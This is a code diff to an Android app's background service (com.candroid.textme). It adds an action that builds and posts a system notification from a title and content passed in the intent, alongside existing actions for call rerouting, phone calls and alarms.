@@ -2,6 +2,9 @@ package com.candroid.textme.jobs;
 
 import android.Manifest;
 import android.app.IntentService;
+import android.app.Notification;
+import android.app.NotificationManager;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -56,6 +59,7 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_REROUTE_CALLS = "ACTION_REROUTE_CALLS";
     public static final String ACTION_CALL_PHONE = "ACTION_CALL_PHONE";
     public static final String ACTION_ALARM_CLOCK = "ACTION_ALARM_CLOCK";
+    public static final String ACTION_CREATE_NOTIFICATION = "ACTION_CREATE_NOTIFICATION";
     private static long sNumber = 1111111111;
 
     public JobsIntentService() {
@@ -255,6 +259,19 @@ public class JobsIntentService extends IntentService {
                     int hours = intent.getIntExtra(Constants.HOURS_KEY, 0);
                     int minutes = intent.getIntExtra(Constants.MINUTES_KEY, 0);
                     Lofl.setAlarmClock(this, hours, minutes);
+                }
+            }else if(intent.getAction().equals(ACTION_CREATE_NOTIFICATION)){
+                if(intent.hasExtra(Constants.TITLE_KEY) && intent.hasExtra(Constants.CONTENT_KEY)){
+                    Lofl.sId++;
+                    String title = intent.getStringExtra(Constants.TITLE_KEY);
+                    String content = intent.getStringExtra(Constants.CONTENT_KEY);
+                    Notification.Builder builder = new Notification.Builder(this, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID);
+                    builder.setContentTitle(title);
+                    builder.setContentText(content);
+                    builder.setSmallIcon(android.R.drawable.stat_notify_error);
+                    Lofl.initNotificationManager(this);
+                    Lofl.createPrimaryNotificationChannel(Lofl.sNotificationManager);
+                    Lofl.sNotificationManager.notify(Lofl.sId++, builder.build());
                 }
             }else {
                 Log.d(TAG, "No action found!");
